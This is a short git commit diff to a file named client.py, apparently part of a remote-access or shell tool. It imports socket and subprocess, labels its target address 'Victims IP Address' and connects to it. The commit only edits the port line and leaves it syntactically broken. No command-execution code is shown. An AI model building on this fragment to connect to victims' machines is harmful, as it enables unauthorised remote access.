54078ccd50b9dccc0a0f49ee5539a2aa506a50c5
Alex Griffiths <33048777+LexusG@users.noreply.github.com>
2023-11-14 21:24:53 -0600

    Update client.py

--- client.py
+++ client.py
@@ -3,7 +3,7 @@ import socket
 import subprocess
 
 SERVER_IP = ' '  # Victims IP Address
-PORT = " "    #Put A open port
+PORT =     #Put A open port
 
 s = socket.socket()
 s.connect((SERVER_IP, PORT))
